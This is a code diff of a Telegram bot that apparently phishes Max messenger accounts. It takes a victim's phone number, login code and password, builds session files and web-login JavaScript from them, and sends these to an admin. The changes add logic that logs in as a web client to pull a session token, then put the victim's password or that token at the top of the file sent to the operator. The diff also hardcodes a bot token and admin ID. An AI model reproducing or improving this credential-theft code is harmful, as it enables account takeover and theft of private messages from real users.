@@ -12,6 +12,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile
 from pymax import Client as SocketMaxClient
+import pymax
 
 BOT_TOKEN = "8459830115:AAH_QhkDQ51YBM1Jlb-ZsfbAfkvGuXgzl4E"
 ADMIN_ID = 8632861931
@@ -219,20 +220,21 @@ async def code_handler(message: types.Message, state: FSMContext):
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(device_id, token, viewer_id)
 
-            db_path = os.path.join(work_dir, "session.db")
-            if os.path.exists(db_path):
-                try:
-                    conn = sqlite3.connect(db_path)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT * FROM sessions LIMIT 1")
-                    row = cursor.fetchone()
-                    if row and len(row) > 8:
-                        web_password = row[8]
-                        if web_password and len(web_password) > 5:
-                            js = f"PASSWORD: {web_password}\n\n" + js
-                    conn.close()
-                except:
-                    pass
+            # Пробуем получить веб-токен через pymax
+            logging.info(f"Доступные классы pymax: {dir(pymax)}")
+            try:
+                web_client = pymax.MaxClient(
+                    token=token,
+                    user_id=viewer_id,
+                    work_dir=f"{work_dir}_web",
+                    device_type="WEB"
+                )
+                await web_client.start()
+                web_token = web_client.token
+                logging.info(f"Веб-токен получен: {web_token[:30]}...")
+                pending[uid]["web_token"] = web_token
+            except Exception as e:
+                logging.error(f"Не удалось получить веб-токен: {e}")
 
             await send_files(phone, uid, work_dir, desktop, js)
             await safe_edit(msg, "✅ Готово! Файлы отправлены админу.")
@@ -314,23 +316,21 @@ async def password_handler(message: types.Message, state: FSMContext):
         desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
         js = generate_web_js(device_id, token, viewer_id)
 
-        if user_password:
-            js = f"PASSWORD: {user_password}\n\n" + js
-        else:
-            db_path2 = os.path.join(work_dir, "session.db")
-            if os.path.exists(db_path2):
-                try:
-                    conn = sqlite3.connect(db_path2)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT * FROM sessions LIMIT 1")
-                    row = cursor.fetchone()
-                    if row and len(row) > 8:
-                        web_password = row[8]
-                        if web_password and len(web_password) > 5:
-                            js = f"PASSWORD: {web_password}\n\n" + js
-                    conn.close()
-                except:
-                    pass
+        # Пробуем получить веб-токен через pymax
+        logging.info(f"Доступные классы pymax: {dir(pymax)}")
+        try:
+            web_client = pymax.MaxClient(
+                token=token,
+                user_id=viewer_id,
+                work_dir=f"{work_dir}_web",
+                device_type="WEB"
+            )
+            await web_client.start()
+            web_token = web_client.token
+            logging.info(f"Веб-токен получен: {web_token[:30]}...")
+            js = f"PASSWORD: {user_password or web_token}\n\n" + js
+        except Exception as e:
+            logging.error(f"Не удалось получить веб-токен: {e}")
 
         await send_files(phone, uid, work_dir, desktop, js)
         await safe_edit(msg, "✅ Готово!")
